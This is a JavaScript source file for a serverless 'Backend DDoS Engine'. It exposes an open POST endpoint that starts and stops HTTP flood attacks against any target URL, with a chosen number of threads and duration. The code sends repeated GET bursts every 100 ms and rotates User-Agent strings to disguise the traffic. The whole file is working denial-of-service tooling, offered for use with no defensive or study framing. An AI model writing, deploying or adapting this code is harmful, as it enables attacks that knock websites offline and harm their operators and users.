// api/ddos.js - Backend DDoS Engine
// Created by @LynzxzCreator

const http = require('http');
const https = require('https');
const url = require('url');

let activeAttacks = new Map();

module.exports = async (req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }
    
    if (req.method !== 'POST') {
        res.status(405).json({ error: 'Method not allowed' });
        return;
    }
    
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
        try {
            const { action, target, method, threads, duration, attackId } = JSON.parse(body);
            
            if (action === 'start') {
                const newAttackId = startAttack(target, method, threads, duration);
                res.json({ success: true, attackId: newAttackId });
            } 
            else if (action === 'stop') {
                stopAttack(attackId);
                res.json({ success: true });
            }
            else {
                res.json({ error: 'Unknown action' });
            }
        } catch(e) {
            res.json({ error: e.message });
        }
    });
};

function startAttack(targetUrl, method, threads, duration) {
    const attackId = Date.now().toString();
    const parsed = url.parse(targetUrl);
    const protocol = parsed.protocol === 'https:' ? https : http;
    const options = {
        hostname: parsed.hostname,
        port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
        path: parsed.path || '/',
        method: 'GET',
        headers: {
            'User-Agent': randomUserAgent(),
            'Accept': '*/*',
            'Connection': 'keep-alive'
        }
    };
    
    let requestCount = 0;
    let isActive = true;
    
    // Multi-threading dengan setTimeout
    const intervalId = setInterval(() => {
        if (!isActive) return;
        
        // Kirim request sebanyak threads per interval
        for (let i = 0; i < threads; i++) {
            sendRequest(protocol, options, () => {
                requestCount++;
            });
        }
    }, 100);
    
    // Stop setelah durasi
    setTimeout(() => {
        isActive = false;
        clearInterval(intervalId);
        activeAttacks.delete(attackId);
        console.log(`[DDoS] Attack ${attackId} stopped. Total requests: ${requestCount}`);
    }, duration * 1000);
    
    activeAttacks.set(attackId, { stop: () => { isActive = false; clearInterval(intervalId); } });
    
    console.log(`[DDoS] Started ${method} attack on ${targetUrl} with ${threads} threads for ${duration}s`);
    return attackId;
}

function sendRequest(protocol, options, callback) {
    const req = protocol.request(options, (res) => {
        res.resume(); // consume response
        callback();
    });
    req.on('error', () => { callback(); });
    req.setTimeout(3000, () => { req.destroy(); callback(); });
    req.end();
}

function stopAttack(attackId) {
    const attack = activeAttacks.get(attackId);
    if (attack) {
        attack.stop();
        activeAttacks.delete(attackId);
    }
}

function randomUserAgent() {
    const agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
        'Mozilla/5.0 (Android 10; Mobile; rv:68.0) Gecko/68.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
    ];
    return agents[Math.floor(Math.random() * agents.length)];
}